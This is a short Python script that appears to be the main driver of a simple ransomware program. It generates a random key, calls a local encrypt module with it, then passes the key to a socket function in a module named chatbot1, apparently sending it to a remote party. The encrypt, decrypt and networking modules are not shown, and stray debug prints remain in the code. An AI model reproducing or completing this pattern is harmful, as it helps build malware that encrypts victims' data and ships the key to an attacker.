import os
import body
import encrypt
import decrypt
import random
import tkinter as tk
from threading import *
import threading
import chatbot1
Key=''
def generateKey(size):
    chars = list("abcdefghijklmnopqrstuvwxyz1234567890=-+_*\|?><,.{]}[()")
    indexs = []
    for _ in range(size):
        indexs.append(random.randint(0, len(chars) - 1))
    return "".join(list(map(lambda x : chars[x], indexs)))

Key=generateKey(100)
print("Shashank")
def main2():
    encrypt.encryption(Key)
print("Shashank")
main2()
print("hekk")
chatbot1.Socke(Key)
